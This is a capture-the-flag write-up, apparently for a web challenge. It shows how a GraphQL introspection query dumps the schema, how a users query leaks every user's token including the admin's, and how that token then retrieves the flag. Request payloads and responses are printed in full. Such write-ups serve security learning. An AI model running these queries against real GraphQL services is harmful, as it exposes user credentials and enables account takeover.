> When we trigger a `Get A Free Preview`, we can observe a **graphQL** payload. Therefore, we try to dump the database.

```http
POST /graphql HTTP/1.1
Host: devme.be.ax
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: */*
Accept-Language: de,en-US;q=0.7,en;q=0.3
Accept-Encoding: gzip, deflate
Referer: https://devme.be.ax/index.html
Content-Type: application/json
Origin: https://devme.be.ax
Content-Length: 148
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers
Connection: close

{"query":"mutation createUser($email: String!) {\n\tcreateUser(email: $email) {\n\t\tusername\n\t}\n}\n","variables":{"email":"qts82375@zwoho.com"}}
```

Our main sourceis <https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/GraphQL%20Injection> to get a basic understanding. However, <https://medium.com/@ghostlulzhacks/api-hacking-graphql-7b2866ba1cf2> explains what steps are needed to expose data.

```json
{
	"query":"{__schema{types{name,fields{name}}}}"
}
```

yields

```json

{
   "data":{
      "__schema":{
         "types":[
            {
               "name":"Query",
               "fields":[
                  {
                     "name":"users"
                  },
                  {
                     "name":"flag"
                  }
               ]
            },
            {
               "name":"String",
               "fields":null
            },
            {
               "name":"Mutation",
               "fields":[
                  {
                     "name":"createUser"
                  }
               ]
            },
            {
               "name":"User",
               "fields":[
                  {
                     "name":"token"
                  },
                  {
                     "name":"username"
                  }
               ]
            },
            {
               "name":"Boolean",
               "fields":null
            },
            {
               "name":"__Schema",
               "fields":[
                  {
                     "name":"description"
                  },
                  {
                     "name":"types"
                  },
                  {
                     "name":"queryType"
                  },
                  {
                     "name":"mutationType"
                  },
                  {
                     "name":"subscriptionType"
                  },
                  {
                     "name":"directives"
                  }
               ]
            },
            {
               "name":"__Type",
               "fields":[
                  {
                     "name":"kind"
                  },
                  {
                     "name":"name"
                  },
                  {
                     "name":"description"
                  },
                  {
                     "name":"specifiedByUrl"
                  },
                  {
                     "name":"fields"
                  },
                  {
                     "name":"interfaces"
                  },
                  {
                     "name":"possibleTypes"
                  },
                  {
                     "name":"enumValues"
                  },
                  {
                     "name":"inputFields"
                  },
                  {
                     "name":"ofType"
                  }
               ]
            },
            {
               "name":"__TypeKind",
               "fields":null
            },
            {
               "name":"__Field",
               "fields":[
                  {
                     "name":"name"
                  },
                  {
                     "name":"description"
                  },
                  {
                     "name":"args"
                  },
                  {
                     "name":"type"
                  },
                  {
                     "name":"isDeprecated"
                  },
                  {
                     "name":"deprecationReason"
                  }
               ]
            },
            {
               "name":"__InputValue",
               "fields":[
                  {
                     "name":"name"
                  },
                  {
                     "name":"description"
                  },
                  {
                     "name":"type"
                  },
                  {
                     "name":"defaultValue"
                  },
                  {
                     "name":"isDeprecated"
                  },
                  {
                     "name":"deprecationReason"
                  }
               ]
            },
            {
               "name":"__EnumValue",
               "fields":[
                  {
                     "name":"name"
                  },
                  {
                     "name":"description"
                  },
                  {
                     "name":"isDeprecated"
                  },
                  {
                     "name":"deprecationReason"
                  }
               ]
            },
            {
               "name":"__Directive",
               "fields":[
                  {
                     "name":"name"
                  },
                  {
                     "name":"description"
                  },
                  {
                     "name":"isRepeatable"
                  },
                  {
                     "name":"locations"
                  },
                  {
                     "name":"args"
                  }
               ]
            },
            {
               "name":"__DirectiveLocation",
               "fields":null
            }
         ]
      }
   }
}
```

`flag` seems really interesting, but does not work easily, because it is missing a `token`. Therefore, we first try to get some users:

```json
{
	"query":"{users{token,username}}"
}
```

returns one interesting result, namely

```json
{"token":"3cd3a50e63b3cb0a69cfb7d9d4f0ebc1dc1b94143475535930fa3db6e687280b","username":"admin"},
```

After some trying, the following payload will gift us a flag

```json
{
    "query":"{flag(token:\"3cd3a50e63b3cb0a69cfb7d9d4f0ebc1dc1b94143475535930fa3db6e687280b\")}"
}
```